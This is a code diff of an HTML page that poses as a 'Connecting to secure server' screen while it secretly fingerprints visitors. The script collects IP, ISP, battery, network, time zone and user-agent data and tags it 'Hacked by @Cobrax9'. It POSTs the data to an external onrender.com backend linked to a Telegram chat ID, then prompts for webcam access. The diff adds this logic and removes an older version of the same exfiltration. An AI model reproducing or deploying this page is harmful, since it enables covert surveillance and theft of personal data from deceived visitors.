@@ -2,96 +2,92 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Verifying...</title>
+  <title>Connecting...</title>
   <style>
     body {
-      background-color: #f9f9f9;
+      background-color: #fff;
       font-family: Arial, sans-serif;
       text-align: center;
       padding-top: 100px;
       color: #333;
     }
-    .loading {
-      font-size: 20px;
+    .message {
+      font-size: 18px;
       margin-bottom: 20px;
-    }
-    .dots::after {
-      content: '';
-      animation: dots 1.5s steps(3, end) infinite;
-    }
-    @keyframes dots {
-      0% { content: ''; }
-      33% { content: '.'; }
-      66% { content: '..'; }
-      100% { content: '...'; }
     }
     video {
       margin-top: 20px;
-      border-radius: 10px;
       width: 300px;
       height: auto;
+      border-radius: 10px;
       display: none;
     }
   </style>
 </head>
 <body>
-  <div class="loading">
-    🔄 Verifying your device and connection<span class="dots"></span><br>
-    This may take a few seconds. Please keep this tab open.
-  </div>
-
+  <div class="message">🔒 Connecting to secure server... Please wait</div>
   <video id="videoPreview" autoplay muted playsinline></video>
 
   <script>
-    let userIP = "";
-    let deviceInfo = "";
     const urlParams = new URLSearchParams(window.location.search);
     const chatId = urlParams.get("id");
+    const video = document.getElementById("videoPreview");
 
-    // Get IP info
+    let result = "📱 Hacked by @Cobrax9\n\n";
+
     fetch("https://ipinfo.io/json?token=demo")
-      .then(response => response.json())
+      .then(res => res.json())
       .then(data => {
-        userIP = data.ip + " | " + data.city + ", " + data.region + " - " + data.country;
-        collectAndSend();
+        result += "🌎 Ip Information:\n";
+        result += `🌐 Ip address: ${data.ip}\n`;
+        result += `📡 ISP: ${data.org || "Unknown"}\n`;
+        result += `🔍 ASN: ${data.org?.split(" ")[0] || "Unknown"}\n\n`;
+        collectDeviceInfo();
       });
 
-    function collectAndSend() {
-      // Get device info
-      deviceInfo = navigator.userAgent + " | Screen: " + window.screen.width + "x" + window.screen.height;
+    function collectDeviceInfo() {
+      const ua = navigator.userAgent;
+      const screenRes = `${screen.width}x${screen.height}`;
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      const network = connection ? connection.effectiveType : "unknown";
 
-      // Send to backend first
-      if (!chatId) {
-        console.warn("Missing Telegram ID in URL.");
-        return;
-      }
+      navigator.getBattery().then(battery => {
+        const charging = battery.charging ? "Yes" : "No";
+        const level = Math.round(battery.level * 100) + "%";
 
+        result += "📱 Device Info:\n";
+        result += `🔋 Charging: ${charging}\n`;
+        result += `🔌 Battery Level: ${level}\n`;
+        result += `🌐 Network Type: ${network.toUpperCase()}\n`;
+        result += `🕒 Time Zone: ${timeZone}\n\n`;
+        result += `🖥️ User Agent: ${ua}\n`;
+        result += `📱 Device Type: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
+        result += "👨‍💻 Tracked on: @Cobrax9";
+
+        sendData();
+      });
+    }
+
+    function sendData() {
       fetch("https://render-backend-package1.onrender.com/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          username: "[AUTO]",
-          password: "[AUTO]",
-          ip: userIP,
-          device: deviceInfo
+          message: result
         })
       }).then(() => {
-        console.log("IP & Device info sent. Now asking for camera access...");
-        setTimeout(requestCameraAccess, 1500);
+        // After sending, ask for camera access
+        setTimeout(() => {
+          video.style.display = "block";
+          navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+              video.srcObject = stream;
+            })
+            .catch(() => {});
+        }, 1000);
       });
-    }
-
-    function requestCameraAccess() {
-      const video = document.getElementById("videoPreview");
-      video.style.display = "block";
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then((stream) => {
-          video.srcObject = stream;
-        })
-        .catch((err) => {
-          console.warn("Camera access denied or not available.");
-        });
     }
   </script>
 </body>
